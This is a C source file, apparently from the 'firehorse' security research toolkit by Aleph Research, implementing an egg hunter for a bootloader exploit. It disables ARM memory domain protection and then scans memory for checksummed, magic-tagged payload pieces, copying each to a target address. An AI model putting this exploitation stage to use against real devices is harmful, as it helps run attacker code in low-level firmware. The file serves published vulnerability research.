/*
firehorse
by Roee Hay & Noam Hadad, Aleph Research
*/

#include "fh.h"

#define EGGHUNT_MAGIC_START      (0xF1438045)
#define EGGHUNT_MAGIC_END        (0x5408341F)


typedef struct 
{
    u_int32 magic;
    u_int32 part;
    u_int32 size;
    u_int32 *dst;
    u_int32 cksum;
    char payload[];
} __attribute((packed)) egg_t;


/*
 * Egg Hunter code
 */
STACKHOOK(dload) {    
    // set Domain Access Control Register to 0xffffffff
    __asm("MOV R0, #0xFFFFFFFF; MCR p15,0,R0,c3,c0,0;");

    u_int32 *i = (u_int32 *)EGGHUNT_ADDR_START;
    u_int32 *end =  (u_int32 *)EGGHUNT_ADDR_END;
    u_int32 *eggStart = (u_int32 *)-1, *eggEnd, *eggDst;
    u_int32 receivedSize, actualSize = 0;
    u_int32 cksum = 0;
    u_int8 flag = 0;
    egg_t *egg = NULL;
    u_int32 *found = EGGHUNT_FOUND_PARTS;

    // egg hunting
    while (i < end)
    {
        if (*i == EGGHUNT_MAGIC_START)
        {
            //D("start magic found @ %08x", i);
            eggStart = i;
            egg = (egg_t *)eggStart;
            cksum = *i;
        }
        else if (*i == EGGHUNT_MAGIC_END)
        {
            //  D("end magic found @ %08x, cksum = %08x", i, cksum);
            eggEnd = i;
            receivedSize = egg->size;
            actualSize = (u_int32)eggEnd - (u_int32)eggStart - 20;

            if ((actualSize == receivedSize) && !cksum)
            {
                if (*found & (1 << egg->part)) { 
                    i++;
                    continue;
                }
                //D("copying egg part %d from 0x%08x to 0x%08x",egg->part ,&(egg->payload), egg->dst);
                *found |= 1 << egg->part;
                memcpy(egg->dst, egg->payload, egg->size);
            }
            else
            {
                //D("problem with egg part %d chksum 0x%08x", egg->part, cksum);
            }
        } 
        else
        {
            cksum ^= *i;
        }
        i++;
    }
}



